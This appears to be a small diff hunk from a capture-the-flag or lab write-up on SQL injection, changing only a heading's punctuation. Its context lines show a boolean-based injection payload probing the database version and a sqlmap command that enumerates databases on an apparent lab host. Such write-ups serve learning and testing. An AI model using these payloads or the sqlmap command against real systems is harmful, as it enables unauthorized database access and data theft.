@@ -215,7 +215,7 @@ may 2020'and substring(@@version,1,1 )=8 and '1=1
 
 
 
-==Using SQL map== for the identified vulnerable Query parameter :-
+==Using SQL map== for the identified vulnerable Query parameter  
 sqlmap -u http://sqli2.naham.sec:8081/article-count?date=may%202020 --dbs --batch
 
 ```
